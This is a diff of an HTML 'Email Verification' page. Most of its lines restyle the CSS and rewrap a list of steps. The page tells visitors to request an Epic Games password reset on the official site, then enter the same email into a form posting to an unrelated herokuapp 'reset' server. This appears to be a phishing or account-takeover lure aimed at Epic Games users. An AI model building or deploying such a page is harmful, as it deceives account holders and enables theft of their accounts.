@@ -7,56 +7,82 @@
             font-family: Arial, sans-serif;
             margin: 0;
             padding: 0;
-            background-color: #f4f4f4;
+            background-color: #f5f5f5;
         }
         .container {
-            max-width: 500px;
+            max-width: 600px;
             margin: 0 auto;
             padding: 20px;
             background-color: #fff;
             box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-            border-radius: 5px;
+            border-radius: 10px;
+            text-align: center;
         }
         h1 {
-            text-align: center;
+            color: #007bff;
+            font-size: 28px;
             margin-bottom: 20px;
         }
         label {
             display: block;
+            font-size: 18px;
             margin-bottom: 10px;
         }
         input[type="email"] {
             width: 100%;
-            padding: 10px;
+            padding: 12px;
             border: 1px solid #ccc;
             border-radius: 5px;
             margin-bottom: 20px;
+            font-size: 16px;
         }
         button {
             display: block;
             width: 100%;
-            padding: 10px;
+            padding: 12px;
             background-color: #007bff;
             color: #fff;
             border: none;
             border-radius: 5px;
             cursor: pointer;
+            font-size: 18px;
         }
         p.link-section {
             margin-top: 20px;
+            font-size: 16px;
+        }
+        .instructions {
+            margin-bottom: 30px;
+            font-size: 18px;
+        }
+        .instructions ol {
+            padding-left: 20px;
+        }
+        .instructions ol li {
+            list-style-type: decimal;
+            margin-bottom: 10px;
+        }
+        a {
+            color: #007bff;
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
         }
     </style>
 </head>
 <body>
     <div class="container">
         <h1>Email Verification</h1>
-        <p>Follow these steps to get your reset link:</p>
-        <ol>
-            <li>First go to <a href="https://www.epicgames.com/id/login/forgot-password" target="_blank">https://www.epicgames.com/id/login/forgot-password</a></li>
-            <li>Enter your email to send the reset link. This will send the reset link.</li>
-            <li>Now Enter the same email in the form below and and click "Verify"</li>
-            <li>Wait for your reset for 10-30 seconds or try again.</li>
-        </ol>
+        <div class="instructions">
+            <p>Follow these steps to get your reset link:</p>
+            <ol>
+                <li>First go to <a href="https://www.epicgames.com/id/login/forgot-password" target="_blank">https://www.epicgames.com/id/login/forgot-password</a></li>
+                <li>Enter your email to send the reset link. This will send the reset link.</li>
+                <li>Now enter the same email in the form below and click "Verify"</li>
+                <li>Wait for your reset for 10-30 seconds or try again.</li>
+            </ol>
+        </div>
         <form method="POST" action="https://mrcliff-reset-7af98657daa2.herokuapp.com/reset/verify_email">
             <label for="email">Enter your email:</label>
             <input type="email" name="email" id="email" required>
